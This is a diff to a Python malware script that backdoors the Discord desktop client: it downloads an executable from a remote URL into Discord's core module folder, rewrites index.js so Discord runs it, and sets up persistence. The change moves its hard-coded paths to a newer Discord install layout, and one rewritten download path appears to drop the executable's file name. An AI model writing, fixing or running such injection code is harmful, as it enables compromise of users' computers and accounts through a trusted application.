@@ -7,7 +7,7 @@ user = str(os.environ["USERNAME"])
 basename = str(os.path.basename(__file__))
 
 payload = """const { exec } = require("child_process");
-exec("C:\\\\Users\\\\""" + user + """\\\\AppData\\\\Roaming\\\\discord\\\\0.0.309\\\\modules\\\\discord_desktop_core\\\\module.exe", (error, stdout, stderr) => {
+exec("C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Discord\\\\app-1.0.9001\\\\modules\\\\discord_desktop_core-1\\\\discord_desktop_core\\\\module.exe", (error, stdout, stderr) => {
 if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -23,7 +23,7 @@ module.exports = require('./core.asar');
 
 def download_module():
     r = requests.get(url, allow_redirects=True)
-    with open("C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\module.exe", "wb") as f:
+    with open("C:\\Users\\" + user + "\\AppData\\Local\\Discord\\app-1.0.9001\\modules\\discord_desktop_core-1\\discord_desktop_core", "wb") as f:
         f.write(r.content) 
 
 def backdoor(filename):
@@ -41,7 +41,7 @@ def persistance():
     exit()
 
 def main():
-    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
+    path = "C:\\Users\\" + user + "\\AppData\\Local\\Discord\\app-1.0.9001\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js"
     download_module()
     backdoor(path)
     persistance()
